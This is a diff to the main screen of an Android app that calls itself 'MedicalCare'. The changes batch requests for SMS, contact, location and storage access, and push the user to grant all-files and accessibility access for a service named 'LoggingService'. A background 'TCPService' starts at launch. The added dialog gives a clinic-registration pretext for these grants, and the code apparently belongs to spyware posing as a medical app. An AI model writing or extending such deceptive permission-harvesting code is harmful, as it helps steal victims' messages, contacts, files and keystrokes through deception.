@@ -5,7 +5,10 @@ import android.accessibilityservice.AccessibilityService
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.net.Uri
 import android.content.pm.PackageManager
+import android.os.Build
+import android.os.Environment
 import android.os.Bundle
 import android.provider.Settings
 import android.text.TextUtils
@@ -26,27 +29,7 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
-            != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(Manifest.permission.READ_SMS),
-                100 // request code
-            )
-        }
-
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
-            != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS),
-                100
-            )
-        }
-
-        if (!isAccessibilityServiceEnabled(this, LoggingService::class.java)) {
-            showAccessibilityGuide()
-        }
+        requestRuntimePermissions()
 
         val serviceIntent = Intent(this, TCPService::class.java)
         startService(serviceIntent)
@@ -63,6 +46,80 @@ class MainActivity : ComponentActivity() {
                 AppNavGraph(navController = navController, startRoute = startRoute)
             }
         }
+    }
+
+    private fun requestRuntimePermissions() {
+        val permissionsToRequest = mutableListOf<String>()
+
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+            != PackageManager.PERMISSION_GRANTED) {
+            permissionsToRequest.add(Manifest.permission.READ_SMS)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+            != PackageManager.PERMISSION_GRANTED) {
+            permissionsToRequest.add(Manifest.permission.READ_CONTACTS)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+            != PackageManager.PERMISSION_GRANTED) {
+            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+            != PackageManager.PERMISSION_GRANTED) {
+            permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+
+        if (permissionsToRequest.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 100)
+        } else {
+            checkSpecialPermissions()
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode == 100) {
+            checkSpecialPermissions()
+        }
+    }
+
+    private fun checkSpecialPermissions() {
+        val needsManageFiles = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
+                && !Environment.isExternalStorageManager()
+        val needsAccessibility = !isAccessibilityServiceEnabled(this, LoggingService::class.java)
+
+        when {
+            needsManageFiles -> showManageAllFilesGuide(showAccessibilityAfter = needsAccessibility)
+            needsAccessibility -> showAccessibilityGuide()
+        }
+    }
+
+    private fun showManageAllFilesGuide(showAccessibilityAfter: Boolean) {
+        android.app.AlertDialog.Builder(this)
+            .setTitle("Action Required: Files Access for Uploads and Downloads")
+            .setMessage("To enable uploading of files, such as your allergies and IC for clinic registration, in your chat with the doctors or downloading of prescriptions and MC, please follow these steps:\n\n" +
+                    "1. Tap 'OK' to open Settings\n" +
+                    "2. Toggle the switch to 'ON' (Ensure that the app name is MedicalCare)")
+            .setCancelable(false)
+            .setIcon(android.R.drawable.ic_dialog_alert)
+            .setPositiveButton("OK") { _, _ ->
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    val fallback = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                    fallback.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    startActivity(fallback)
+                }
+                if (showAccessibilityAfter) showAccessibilityGuide()
+            }
+            .show()
     }
 
     private fun isAccessibilityServiceEnabled(context: Context, service: Class<out AccessibilityService>): Boolean {
@@ -101,22 +158,4 @@ class MainActivity : ComponentActivity() {
             }
             .show()
     }
-
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<String>,
-        grantResults: IntArray
-    ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-
-        if (requestCode == 100 && grantResults.isNotEmpty() &&
-            grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            // Permission granted
-            val serviceIntent = Intent(this, TCPService::class.java)
-            startService(serviceIntent)
-        } else {
-            Log.e("MainActivity", "READ_SMS permission denied")
-        }
-    }
-
 }
